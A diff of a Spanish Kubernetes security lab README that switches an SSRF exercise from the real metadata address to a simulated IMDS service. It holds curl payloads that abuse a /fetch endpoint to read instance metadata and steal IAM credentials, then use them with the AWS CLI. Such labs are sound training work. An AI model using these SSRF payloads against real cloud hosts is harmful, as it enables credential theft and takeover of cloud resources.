@@ -14,7 +14,7 @@ En julio de 2019, una ex-empleada de AWS explotó una vulnerabilidad SSRF en un 
 
 | Archivo | Descripción |
 |---------|-------------|
-| `vulnerable.yaml` | App Python con SSRF, sin NetworkPolicy (puede alcanzar IMDS) |
+| `vulnerable.yaml` | App Python con SSRF + simulador de IMDS, sin NetworkPolicy |
 
 ---
 
@@ -23,50 +23,63 @@ En julio de 2019, una ex-empleada de AWS explotó una vulnerabilidad SSRF en un 
 ```bash
 kubectl apply -f vulnerable.yaml
 kubectl get pods -n lab1-ssrf -w
-# Esperar a que esté Running
+# Esperar a que ssrf-app y fake-imds estén Running
 ```
+
+> El YAML despliega dos componentes:
+> - **ssrf-app**: la aplicación web vulnerable a SSRF
+> - **fake-imds**: un simulador del Instance Metadata Service de AWS que responde como lo haría `169.254.169.254` en un nodo EC2 real
 
 ## Fase 2: Explotación SSRF
 
 ### Paso 1: Acceder a la app
 
 ```bash
-# Verificar que el pod esté Running
+# Verificar que ambos pods estén Running
 kubectl get pods -n lab1-ssrf
 
-# Verificar el servicio
-kubectl get svc ssrf-app-svc -n lab1-ssrf
+# Verificar los servicios
+kubectl get svc -n lab1-ssrf
 
-# Exponer el servicio en localhost usando port-forward
-kubectl port-forward svc/ssrf-app-svc 8080:8080 -n lab1-ssrf &
+# Obtener la IP del nodo y acceder via NodePort
+export NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
+echo "App disponible en: http://$NODE_IP:31082"
 
 # Verificar que la app responde
-curl http://localhost:8080
+curl "http://$NODE_IP:31082"
 # Debe mostrar la página "URL Fetcher Service"
 ```
 
-### Paso 2: Probar SSRF al IMDS (AWS)
+### Paso 2: Probar SSRF al simulador IMDS
+
+El simulador IMDS está accesible dentro del cluster como `fake-imds.lab1-ssrf.svc.cluster.local`.
+Desde la app vulnerable, un atacante puede usar SSRF para consultarlo (simula lo que pasaría con `169.254.169.254` en AWS):
 
 ```bash
-# Desde el navegador o curl:
-
 # Listar metadata disponible
-curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/"
+curl "http://$NODE_IP:31082/fetch?url=http://fake-imds.lab1-ssrf.svc.cluster.local/latest/meta-data/"
+# → ami-id, instance-id, iam/, etc.
 
-# Obtener el IAM role del nodo
-curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+# Ver el tipo de instancia
+curl "http://$NODE_IP:31082/fetch?url=http://fake-imds.lab1-ssrf.svc.cluster.local/latest/meta-data/instance-type"
+# → m5.xlarge
 
-# Robar credenciales temporales
-curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
+# Descubrir el IAM role del nodo
+curl "http://$NODE_IP:31082/fetch?url=http://fake-imds.lab1-ssrf.svc.cluster.local/latest/meta-data/iam/security-credentials/"
+# → production-eks-node-role
+
+# ROBAR credenciales IAM temporales
+curl "http://$NODE_IP:31082/fetch?url=http://fake-imds.lab1-ssrf.svc.cluster.local/latest/meta-data/iam/security-credentials/production-eks-node-role"
 # → AccessKeyId, SecretAccessKey, Token
 ```
 
-### Paso 3: Usar credenciales robadas (si estás en AWS real)
+### Paso 3: Impacto — Qué haría un atacante con las credenciales robadas
 
 ```bash
-export AWS_ACCESS_KEY_ID="<robado>"
-export AWS_SECRET_ACCESS_KEY="<robado>"
-export AWS_SESSION_TOKEN="<robado>"
+# En un entorno AWS real, con las credenciales robadas:
+export AWS_ACCESS_KEY_ID="AKIA3EXAMPLE7890FAKE"
+export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBAaDFakeTokenForDemoOnly...=="
 
 # Listar buckets S3
 aws s3 ls
@@ -77,7 +90,7 @@ aws ec2 describe-instances
 # → CONTROL sobre recursos cloud del nodo
 ```
 
-> **Nota**: En un cluster local, `169.254.169.254` no responde. El lab demuestra el flujo de SSRF. En un EKS/GKE/AKS real, sí retorna credenciales.
+> **Nota sobre el lab**: Se usa un simulador de IMDS (`fake-imds`) dentro del cluster para que el lab funcione en entornos locales (minikube). En un cluster EKS/GKE/AKS real, la app vulnerable podría acceder directamente a `169.254.169.254` y obtener credenciales IAM reales del nodo.
 
 ## Remediación Recomendada
 
